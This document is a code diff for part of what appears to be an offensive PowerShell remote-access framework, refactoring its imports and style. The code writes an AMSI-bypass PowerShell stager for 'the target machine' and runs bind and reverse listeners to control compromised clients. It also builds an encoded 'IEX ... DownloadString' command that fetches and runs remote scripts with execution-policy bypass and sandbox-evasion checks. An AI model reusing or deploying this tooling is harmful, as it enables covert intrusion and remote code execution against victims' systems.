@@ -1,16 +1,25 @@
 from __future__ import unicode_literals
-from main import *
-from menu import *
-from main import amsiPatch
+
+import prompt_toolkit
+import blessed
+import time
 from prompt_toolkit.contrib.completers import WordCompleter
+from base64 import b64encode
+from listener import Server
+from menu import clientMenuOptions, returnIP
+from main import amsiPatch, payloaddir, randomUnusedPort, DoServe, \
+                 powershellShellcodeLayout, randomisePS1
+
 
 history = prompt_toolkit.history.InMemoryHistory()
 
+t = blessed.Terminal()
+
 serverlist = []
+
 
 def killAllClients():
     numberofclientskilled = 0
-    from menu import clientMenuOptions
     if len(clientMenuOptions) > 2:
         suretoquit = raw_input('You have clients connected. Are you sure you want to exit? [y]/n: ')
         if suretoquit.lower() == 'y' or suretoquit.lower() == '':
@@ -24,9 +33,8 @@ def killAllClients():
     else:
         return True
 
+
 def printListener(printit=True, returnit=False):
-    from listener import Server
-    from menu import returnIP
     powershellFileName = 'p.ps1'
 
     while True:
@@ -39,7 +47,7 @@ def printListener(printit=True, returnit=False):
     if bindOrReverse == 'b':
         windows_powershell_stager = powershellContent % ('True', '', '5556')
 
-    with open((payloaddir()+ '/' + powershellFileName), 'w') as powershellStagerFile:
+    with open((payloaddir() + '/' + powershellFileName), 'w') as powershellStagerFile:
         stager_content = amsiPatch + windows_powershell_stager
         powershellStagerFile.write(stager_content)
         powershellStagerFile.close()
@@ -53,13 +61,13 @@ def printListener(printit=True, returnit=False):
         print t.bold_green + '[!] Run this on target machine...' + t.normal + '\n\n' + stagerexec + '\n'
 
     if bindOrReverse == 'b':
-        if not '5556' in str(serverlist):
+        if '5556' not in str(serverlist):
             ipADDR = raw_input('[?] IP Address of target (after executing stager): ')
             connectserver = Server(ipADDR, 5556, bindsocket=False)
             serverlist.append(connectserver)
 
     if bindOrReverse == 'r':
-        if not '5555' in str(serverlist):
+        if '5555' not in str(serverlist):
             listenerserver = Server('0.0.0.0', 5555, bindsocket=True)
             serverlist.append(listenerserver)
     if returnit:
@@ -89,7 +97,7 @@ def interactShell(clientnumber):
                     if command == "":
                         server.handlers[clientnumber].out_buffer.append('{"type":"", "data":"", "sendoutput":""}')
                     else:
-                        json = '{"type":"exec", "data":"%s", "sendoutput":"true"}'% ((base64.b64encode(command.encode('utf_16_le'))))
+                        json = '{"type":"exec", "data":"%s", "sendoutput":"true"}'% ((b64encode(command.encode('utf_16_le'))))
                         server.handlers[clientnumber].out_buffer.append(json)
                         while not server.handlers[clientnumber].in_buffer:
                             time.sleep(0.01)
@@ -99,8 +107,10 @@ def interactShell(clientnumber):
 
     return "clear"
 
+
 def returnServerList():
     return serverlist
+
 
 def checkPayloadLength(payload):
     maxlen = 10000
@@ -148,6 +158,7 @@ def checkUpload():
                 continue
     return False
 
+
 def clientUpload(powershellExec, isExe, json):
     from menu import returnIP
     from encrypt import getSandboxScripts
@@ -160,18 +171,14 @@ def clientUpload(powershellExec, isExe, json):
             filename = powershellChanges.get('filename')
             pForce = powershellChanges['params'].get('Force')
             pCode = powershellChanges['params'].get('Shellcode')
-
             DoServe(returnIP(), "", "./externalmodules/staged", port=moduleport, printIt=False)
             encPowershell = getSandboxScripts('powershell')
             encPowershell += "IEX(New-Object Net.WebClient).DownloadString('http://%s:%s/%s.ps1');Start-Sleep 30;%s -%s -%s @(%s)"%(returnIP(), moduleport, filename, filename, pForce, pCode, newpayloadlayout.rstrip(','))
-            encPowershell = base64.b64encode(encPowershell.encode('UTF-16LE'))
-            fullExec = "$Arch = (Get-Process -Id $PID).StartInfo.EnvironmentVariables['PROCESSOR_ARCHITECTURE'];if($Arch -eq 'x86'){powershell -exec bypass -enc \"%s\"}elseif($Arch -eq 'amd64'){$powershell86 = $env:windir + '\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe';& $powershell86 -exec bypass -enc \"%s\"}"%(encPowershell,encPowershell)
-            b64Exec = base64.b64encode(fullExec.encode('UTF-16LE'))
-            lenb64 = len(b64Exec)
+            encPowershell = b64encode(encPowershell.encode('UTF-16LE'))
+            fullExec = "$Arch = (Get-Process -Id $PID).StartInfo.EnvironmentVariables['PROCESSOR_ARCHITECTURE'];if($Arch -eq 'x86'){powershell -exec bypass -enc \"%s\"}elseif($Arch -eq 'amd64'){$powershell86 = $env:windir + '\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe';& $powershell86 -exec bypass -enc \"%s\"}"%(encPowershell,encPowershell)
+            b64Exec = b64encode(fullExec.encode('UTF-16LE'))
         else:
-            b64Exec = base64.b64encode(powershellExec.encode('UTF-16LE'))
-            lenb64 = len(b64Exec)
-
+            b64Exec = b64encode(powershellExec.encode('UTF-16LE'))
 
         splitPayoad = checkPayloadLength(b64Exec)
 
